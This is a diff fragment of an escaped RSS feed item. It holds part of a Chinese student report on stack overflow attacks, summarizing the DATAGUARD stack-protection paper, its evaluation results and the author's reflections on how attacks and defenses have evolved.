+	height=&#34;110&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-9_hu_41b88fb05db0083f.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-9_hu_2ad3940b439b63e6.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;防御方案&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;503&#34;
+		data-flex-basis=&#34;1208px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;论文提出了DATAGUARD系统，作为一种新的堆栈防护方案，其核心思路是通过静态分析和约束符号执行相结合的方法，对每个堆栈对象进行安全性验证。
+论文在安全性定义方面做出了扩展，不再局限于仅保护代码指针，而是要求所有被保护的堆栈对象必须在所有可能的执行路径上满足严格的安全约束。具体来说，一个堆栈对象要被认定为安全，必须确保所有可能引用该对象的指针在空间上访问都严格位于该对象的边界内，在类型转换上不会发生数值或语义上的改变，并且在使用时始终处于合法的生命周期之内。为此，作者设计了一套验证机制，既包括静态分析，也引入了符号执行技术。通过静态分析，系统可以初步对堆栈对象的定义、引用和使用情况进行推导，生成与空间、类型和时间安全相关的约束；而针对那些因过于保守而不能直接证明安全的对象，则借助符号执行进一步验证其在所有可能路径上是否满足安全条件，防止静态阶段错误的安全分类。
+DATAGUARD利用LLVM平台上的中间表示（SSA形式）结合现有的程序依赖图（PDG）和SVF工具进行指针别名和活跃区间分析，并通过S2E框架对部分难以断定的情况采用有针对性的符号执行。只有那些在所有可能情况中均无安全隐患的堆栈对象，才能被归入安全类别，并最终移入与常规堆栈隔离的安全堆栈中，以完全依赖编译期生成的运行时保护机制提供高效的安全防护。&lt;/p&gt;
+&lt;h4 id=&#34;224-实验评估&#34;&gt;2.2.4 实验评估
+&lt;/h4&gt;&lt;p&gt;论文在多个服务器程序（如nginx、httpd、openvpn等）以及SPEC CPU2006基准测试上进行了评估。结果显示，DATAGUARD能够将更多原本被传统Safe Stack方法判定为不安全的堆栈对象判定为安全，从而在扩展堆栈保护范围的同时，还能降低运行时防护的性能开销。例如，在SPEC CPU006基准测试中，通过DATAGUARD方式保护堆栈对象所增加的性能开销平均由11.3%降低到4.3%。&lt;/p&gt;
+&lt;h4 id=&#34;225-总结和展望&#34;&gt;2.2.5 总结和展望
+&lt;/h4&gt;&lt;p&gt;论文基于隔离栈的技术，参考OSDI&#39;14上的一篇工作《Code-pointer integrity》，在保证代码指针的完整性基础上，通过建立更严格的安全定义，将堆栈对象的保护范围从单一的返回地址扩展到所有堆栈数据。另外通过静态分析与符号执行相结合的验证方法，确保只有在所有可能的执行情形下均满足严格安全约束的对象才被归入安全堆栈，从而在不牺牲安全性的前提下显著降低运行时检测的开销。该工作为内存错误防护提供了新的视角，不仅提高了堆栈数据的保护力度，而且为相关防御措施的改进指明了方向。&lt;/p&gt;
+&lt;h2 id=&#34;3-个人心得体会&#34;&gt;3. 个人心得体会
+&lt;/h2&gt;&lt;p&gt;在准备此次作业的过程中，从实际操作和文献上了解到了栈溢出攻击和防御。在文献的阅读上，检索到了较多的相关文献，除了上述两篇以外，还涉及到许多顶会的论文文献（PPT中讲述），切身感受到当前研究趋势的多样化与日益精细化。
+传统的缓冲区溢出攻击主要集中在利用简单的内存溢出和代码注入技术，攻击者通过构造特定的数据溢出，突破系统的基本防护措施，实现任意代码执行。面对这些攻击，最初的防御手段也相对单一，主要依赖操作系统级的内存保护和简单的补丁修复。尽管这些措施在一定程度上限制了攻击者的手段，但仍无法彻底消除漏洞。
+随着攻击技术的不断发展，攻击者不再满足于简单的利用方式，而是开始运用更复杂的技术，如利用各类攻击链（如上述的CHOP）、动态生成ROP链条以及针对特定平台（例如物联网和专用硬件平台）的新型攻击手法。这种多样化的攻击方式使得传统的防护手段逐渐显示出局限性，需要从根本上升级防御策略。
+在防御领域，研究者逐步从单纯的软件补救措施转向硬件与软件相结合的综合防护机制。硬件层面的防御方法，如利用硬件控制流保护与指针认证机制，显著降低了攻击成功率；同时，控制流完整性检查和编译器辅助的防御技术不断完善，通过在代码编译和运行时对潜在的利用点进行分析与约束，进一步提高了系统的整体安全性。这种多层次的防护体系有效平衡了性能和安全性，构成了应对新型攻击挑战的重要屏障。
+这次的作业备使我充分认识到，栈溢出的攻击和防御对抗发展迅速。攻击手法从传统的单一模式逐步演变为更复杂、更自动化的多平台利用，而防御技术也在不断从单点防护向系统级综合防御转变。&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
